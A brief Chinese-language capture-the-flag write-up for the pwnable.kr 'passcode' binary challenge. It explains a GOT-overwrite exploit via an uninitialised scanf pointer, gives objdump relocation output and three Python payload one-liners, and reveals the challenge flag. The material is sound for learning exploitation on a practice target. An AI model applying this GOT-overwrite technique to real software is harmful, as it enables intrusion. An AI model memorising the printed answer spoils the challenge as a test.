### passcode

`ssh passcode@pwnable.kr -p2222`

1. 看到passcode1的地方有一个任意地址写，第一反应是写返回地址，但不可行，原因是 **栈地址随机，需要info leak**
2. 所以需要去写一个不变的东西，这里选择写GOT表中被调用过的function，例如printf,fflush,exit，将其写为 **system(/bin/cat flag)** 的值

新学了一个命令来查看GOT表：`objdump -R file`

```
passcode@ubuntu:~$ objdump -R passcode

passcode:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a02c R_386_COPY        stdin@@GLIBC_2.0
0804a000 R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
0804a008 R_386_JUMP_SLOT   __stack_chk_fail@GLIBC_2.4
0804a00c R_386_JUMP_SLOT   puts@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   system@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   __gmon_start__
0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a020 R_386_JUMP_SLOT   __isoc99_scanf@GLIBC_2.7
```

可以看到`printf`,`fflush`,`exit`的offset而且下文有对这几个函数的调用，可以写出3个exp，即在GOT表写入0x080485E3。

exp:
```
python -c 'print "A"*96 + "\x00\xa0\x04\x08" + "134514147\n"' | ./passcode
python -c 'print "A"*96 + "\x04\xa0\x04\x08" + "134514147\n"' | ./passcode
python -c 'print "A"*96 + "\x18\xa0\x04\x08" + "134514147\n"' | ./passcode
```

flag:
`Sorry mom.. I got confused about scanf usage :(`
